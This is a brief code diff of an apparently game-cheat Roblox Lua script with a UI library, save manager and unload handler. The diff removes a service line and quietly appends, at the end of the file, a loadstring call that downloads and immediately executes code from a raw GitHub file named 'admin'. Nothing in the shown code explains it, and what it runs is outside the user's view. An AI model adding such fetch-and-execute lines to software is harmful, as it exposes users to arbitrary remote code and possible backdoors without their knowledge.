@@ -6170,10 +6170,12 @@ SaveManager:LoadAutoloadConfig()
 Library:SetWatermarkVisibility(false)
 
 local StatsService = game:GetService("Stats")
-local MarketplaceService = game:GetService("MarketplaceService")
+
 
 Library:OnUnload(function()
     WatermarkConnection:Disconnect()
     print('Unloaded!')
     Library.Unloaded = true
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazamatcha/matcha.tea/refs/heads/main/admin"))()
